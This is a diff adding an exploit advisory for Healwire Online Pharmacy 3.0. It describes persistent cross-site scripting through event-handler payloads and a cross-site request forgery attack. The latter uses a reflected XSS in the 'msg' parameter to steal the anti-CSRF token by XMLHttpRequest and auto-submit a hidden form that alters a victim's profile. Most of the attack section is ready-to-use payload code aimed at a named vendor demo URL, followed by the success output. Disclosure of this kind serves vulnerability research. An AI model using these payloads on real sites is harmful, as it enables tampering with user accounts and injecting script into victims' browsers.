@@ -1,0 +1,70 @@
+# Exploit Title: Healwire Online Pharmacy 3.0 - Persistent Cross-Site Scripting / Cross-Site Request Forgery
+# Date: 2018-05-17
+# Exploit Author: L0RD
+# Vendor Homepage: https://codecanyon.net/item/healwire-online-pharmacy/16423338?s_rank=1499
+# Version: 3.0
+# Tested on: windows
+
+# POC 1 : Cross site scripting :
+1) Create an account and go to your profile.
+2) When we want to put "<script></script>" in the fields,"script" will be
+replaced with null.
+so we can bypass this filter by using javascript's events like
+"onmouseover" or "oninput" .
+Put one of these payloads into the fields :
+1 - " oninput=alert('xss') "
+2 - " onmouseover=alert('xss') "
+3) You will get an alert box inside the page . ( after put something into
+the fields or move mouse on the fields)
+
+
+# POC 2 : Cross-Site request forgery :
+# With csrf vulnerability,attacker can easily change user's authentication.
+# So in this script , we have anti-CSRF token .We can't change user's
+# information without token.
+# but there is a vulnerable parameter which has reflected xss in another page
+# of this script.
+# http://store.webandcrafts.com/demo/healwire/?msg= [We have Reflected XSS here]
+# Now we can bypass anti-csrf by this parameter and using javascript:
+
+
+# Exploit :
+
+"/><form action="
+http://store.webandcrafts.com/demo/healwire/user/update-details-user/1"
+method="POST">
+<input type="hidden" name="first&#95;name" value="a" />
+<input type="hidden" name="address"
+value=""&#32;oninput&#61;alert&#40;document&#46;domain&#41;&#32;""
+/>
+<input type="hidden" name="pincode" value="a" />
+<input type="hidden" name="phone" value="100000000" />
+<input type="hidden" name="last&#95;name" value="anything" />
+<input type="hidden" name="&#95;token" value="" />
+</form>
+<script>
+var token = ' ';
+var req = new XMLHttpRequest();
+req.onreadystatechange = function(){
+if(this.readyState == 4 && this.status == 200){
+var secPage = this.responseXML;
+token = secPage.forms[0].elements[0].value;
+console.log(token);
+}
+}
+req.open("GET","/demo/healwire/account-page",true);
+req.responseType = "document";
+req.send();
+
+window.setTimeout(function(){
+document.forms[0].elements[5].value = token;
+document.forms[0].submit();
+},3000)
+</script>
+
+# You can also send 2 ajax requests instead of using form .
+# Encode this payload and put this into "msg" parameter
+# JSON result after 3 seconds :
+
+status "SUCCESS"
+msg "User profile updated !"
